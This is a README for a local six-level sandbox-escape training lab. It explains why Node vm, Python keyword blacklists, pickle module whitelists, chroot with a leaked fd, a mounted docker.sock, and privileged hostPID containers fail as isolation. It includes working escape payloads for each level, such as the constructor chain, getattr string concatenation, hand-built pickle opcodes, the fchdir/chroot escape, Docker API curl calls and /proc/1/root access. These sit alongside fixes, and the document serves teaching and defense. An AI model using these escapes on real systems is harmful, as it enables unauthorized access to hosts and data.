# Sandbox Escape Lab · 沙箱逃逸靶场

六关，六种隔离手段，六个洞。目标统一：**从沙箱里逃出去，读走 flag**。

前面四关是语言 / 系统调用级别的沙箱（Node 的 `vm`、Python 黑名单、
pickle 白名单、chroot），在浏览器里直接打；后面两关是容器级的
（Docker socket、`privileged` + `hostPID`），要进容器敲命令。

```
L1  8900 页面上     Node.js vm.createContext
L2  8900 页面上     Python 关键字黑名单 + 阉割 builtins
L3  8900 页面上     pickle + 模块白名单
L4  8900 页面上     chroot + 继承的 fd
L5  终端            /var/run/docker.sock 挂进容器
L6  终端            privileged + pid=host
```

---

## 快速开始

```bash
cd sandbox-escape
./setup.sh                  # 或在仓库根目录 ./lab.sh up
```

然后打开 **http://127.0.0.1:8900/**。

一键验证前四关（先自己打，打不动再看）：

```bash
python3 poc/verify.py
```

L5 / L6：

```bash
docker exec -it sbox-sock bash
docker exec -it sbox-priv bash
```

---

## 关卡设计

| # | 关卡 | 沙箱做对了什么 | 洞在哪 |
|---|---|---|---|
| L1 | Node.js `vm` | 干净上下文，没有 `process` / `require` | 上下文对象仍属于宿主 realm，`constructor.constructor` 直通宿主 `Function` |
| L2 | Python 黑名单 | 拦了 11 个关键字，builtins 只留计算器该有的 | 黑名单只匹配字面量；`getattr` + 字符串拼接绕过 |
| L3 | pickle 白名单 | `find_class` 卡住模块名 | qualname 里的点号会被展开成属性链，白名单模块 import 过的都是跳板 |
| L4 | chroot | 把 `/` 换成 `/jail` | 父进程把 `/` 的 fd 传进来了，`fchdir` + `chroot(".")` 原路返回 |
| L5 | Docker socket | —— | socket 等于免密 root，能进任何容器、起任何容器 |
| L6 | privileged + hostPID | —— | 共享宿主 PID 命名空间，`/proc/1/root` 就是宿主根 |

### L1 —— `vm` 为什么不是沙箱

Node 文档原话：*The `vm` module is not a security mechanism.*
`vm.createContext()` 隔离的是**变量作用域**，不是 Realm。沙箱里拿到的每个对象
（包括字面量）都来自宿主进程的 Realm，它们的 `constructor` 指向宿主的构造函数。
顺三次就到宿主：

```js
this.constructor                        // 宿主 Object
    .constructor                        // 宿主 Function
    ('return process')()                // 宿主作用域里执行 —— process 回来了
    .mainModule.require('fs')           // require 也回来了
```

真正要隔离不可信 JS，只能上独立进程 / 单独的系统调用过滤（如
`isolated-vm`、或者干脆丢进另一个容器）。

### L2 —— 黑名单永远漏东西

页面源码里能看到黑名单和允许的 builtins。关键是两个事实：

- 黑名单匹配的是**字符串**，而 Python 的名字可以在运行时拼出来：
  `'_' + '_class_' + '_'` 里没有连续的 `__`，但拼出来就是 `__class__`。
- 允许列表里留了 `getattr`（"看起来人畜无害"），它正好能把拼出来的名字
  当属性名用。

于是 `().__class__.__bases__[0].__subclasses__()` 这一条经典链就通了，
在子类里找一个 `__init__.__globals__` 含 `system` 的（`os._wrap_close`），
直接 `system('cat /flag_l2')`。

黑名单这条路本身是走不通的 —— 要么白名单（且白名单要能穷举），要么不用
`exec`（真正的隔离只能靠进程 / 容器 / seccomp）。

### L3 —— 白名单校验了模块，没校验限定名

`pickle` 在还原对象时，`STACK_GLOBAL` 指令会压入两个字符串：`module` 和
`name`。`name` 是**限定名**，可以带点号，`Unpickler.find_class()` 内部会用
`_getattribute()` 按点号一层层取属性。

自定义 `find_class` 只看了 `module`：

```python
if module not in ALLOWED_MODULES:      # "models" 合法
    raise ...
return super().find_class(module, name) # name = "subprocess.check_output"
```

`models.py` 顶部 `import subprocess`，所以

```
models → models.subprocess → models.subprocess.getoutput
```

载荷是手拼的（6 个 opcode）：

```
PROTO 4
SHORT_BINUNICODE "models"
SHORT_BINUNICODE "subprocess.getoutput"
STACK_GLOBAL
SHORT_BINUNICODE "cat /flag_l3"
TUPLE1
REDUCE
STOP
```

修法：白名单要校验**模块 + 完整限定名**（or 用 `pickle.Unpickler` 的
`find_class` 只放行几个具体类），更彻底的做法是别对不可信数据用 `pickle`。

### L4 —— chroot 不是安全边界

`chroot` 只改「这个进程眼里的 `/` 是哪一层目录」。它不建命名空间、
不拦系统调用、**也不回收已经打开的文件描述符**。

所以 chroot 的有效性依赖一个前提：沙箱里没有任何指向外部的句柄。
本关的 bug 是父进程为了把审计日志写到容器外，提前 `open("/")` 并
`dup2` 成 fd 3 交给沙箱 —— 这个 fd 就是出口：

```python
os.fchdir(3)     # cwd 挪回 jail 外面
os.chroot(".")   # 根也挪出去（进程是 root，没人拦）
os.chdir("/")
open("/flag_l4").read()
```

现实里的对应物：容器逃逸时"挂进来的 socket / 没关的目录 fd / 泄漏的
`/proc/self/fd`"都是同一类问题。

### L5 —— 挂着 socket 的容器等于宿主

`sbox-sock` 挂载了宿主机的 `/var/run/docker.sock`。这个 socket 是 Docker
守护进程的完整 API 入口，没有鉴权 —— 谁连上谁就是 root。

`sbox-vault` 没开端口、没给 shell，只放了一个 `/flag_l5`。但从 runner 里：

```bash
docker exec sbox-vault cat /flag_l5
```

或者不用 CLI，直接拼 API（脚本化时更常见）：

```bash
# 1. 建 exec
curl --unix-socket /var/run/docker.sock -s \
     -H 'Content-Type: application/json' \
     -d '{"AttachStdout":true,"Cmd":["cat","/flag_l5"]}' \
     http://localhost/containers/sbox-vault/exec
# 2. 启动它，输出直接流回来
curl --unix-socket /var/run/docker.sock -s \
     -H 'Content-Type: application/json' \
     -d '{"Detach":false,"Tty":true}' \
     http://localhost/exec/<ExecId>/start
```

更狠的一步是起一个 `-v /:/host --privileged` 的容器，宿主根目录就挂进来了。

修法：不要挂 socket；必须挂的话用 socket proxy 做 API 白名单，或者用
rootless / 无特权构建方案。

### L6 —— `privileged` + `pid: host`

`privileged: true` 给了几乎全部 capability，`pid: host` 让容器和宿主共享
PID 命名空间。两个加在一起，`/proc` 里出现的就是宿主的进程表，
于是 `/proc/1/root` 直接指向宿主根文件系统：

```bash
cat /proc/1/root/lab-escape/l6.flag
```

等价的另一条路是 `nsenter -t 1 -m -u -i -n -p`，进宿主的所有命名空间。

**macOS / Windows 上你逃到的是 Docker Desktop 的 Linux VM，不是 macOS 本身。**
这一条不是"靶场不真实"，而是容器隔离模型的准确体现：容器不是虚拟机，
它和宿主共享内核，而 Docker Desktop 的"宿主"本来就是那台 VM。

---

## 目录结构

```
sandbox-escape/
├── Dockerfile              # 主镜像（python + 借来的 node 二进制）
├── compose.yml             # 四个容器
├── setup.sh                # 一键起 + 铺 L6 的 flag
├── sock/Dockerfile         # L5 的 CI runner 镜像
├── flags/                  # 六个 flag
├── src/
│   ├── server.py           # 调度服务（只用标准库）
│   ├── sandbox/
│   │   ├── l1_run.js       # L1 执行器：vm.createContext
│   │   ├── l2_run.py       # L2 执行器：黑名单 + 阉割 builtins
│   │   ├── l3_run.py       # L3 执行器：pickle 模块白名单
│   │   ├── l4_run.py       # L4 执行器：chroot（带那个 fd）
│   │   └── models.py       # L3 的业务模块（白名单放行的那个）
│   ├── jail/               # chroot 的牢房
│   └── web/                # 页面
├── poc/verify.py           # L1~L4 一键验证
└── answer/ANSWERS.md       # 六关答案
```

---

## 几处实现说明（踩过的坑）

**页面上的输出为什么能拿到 `system()` 的结果？**
每个关卡的用户代码都在**独立子进程**里跑（`subprocess.run` + 10 秒超时），
子进程的 stdout/stderr 原样回到页面。所以 `system('cat /flag')` 这种
直接写 fd 1 的输出也能看到 —— 如果用 `contextlib.redirect_stdout` 在
进程内重定向，反而会丢（`system` 写的是 fd，不是 Python 的 `sys.stdout`）。

**为什么 L4 的 chroot 不影响服务本身？**
`l4_run.py` fork 出子进程才 `chroot`，父进程（服务）的根一直是容器根。

**为什么主镜像要用 node 的二进制而不是 apt 装 nodejs？**
L1 的 runner 只用内置的 `vm` / `fs`，没有 `node_modules`，复制一个静态
一点的 node 二进制比装整个发行版快得多。node 20 在 bookworm 上编译，
跑在 trixie 的 python 镜像里，glibc 向下兼容，没问题。

**L6 的 flag 为什么要放到宿主根目录？**
因为它必须"容器里看不到、宿主上看得到"，否则 `/proc/1/root` 就读不到。
`setup.sh` 用一个挂了 `/:/host` 的一次性容器来写，这样 macOS / Linux
都不用特判。Linux 上是真宿主，只多一个 `/lab-escape/` 目录：

```bash
./setup.sh --clean      # 删掉它
```

---

## 修复对照

| 关卡 | 错误做法 | 正确做法 |
|---|---|---|
| L1 | `vm.createContext` 跑不可信代码 | 独立进程 + 权限剥离；或用 `isolated-vm` |
| L2 | 关键字黑名单 + `exec` | 不要 `exec` 不可信代码；必须解释执行就用白名单 AST 或独立进程 |
| L3 | `pickle` + 模块白名单 | 校验完整限定名；换 JSON / MessagePack |
| L4 | chroot + 传进来的 fd | 不传句柄；用 `pivot_root` + 命名空间 + `no_new_privs` |
| L5 | 挂 `docker.sock` | 不挂；用 socket proxy 做 API 白名单 |
| L6 | `privileged` + `pid: host` | 只给需要的 capability，去掉 hostPID |

---

## 安全声明

- 端口只绑 `127.0.0.1`。
- `sbox-sock` 挂的是**宿主机的 docker.sock**，容器里任何人都能起
  `--privileged -v /:/host` 的容器。**只在你自己机器上跑。**
- L6 会在宿主根目录建 `/lab-escape/`（macOS 上是 Docker VM）。
- 仅用于本地学习与获得授权的测试。
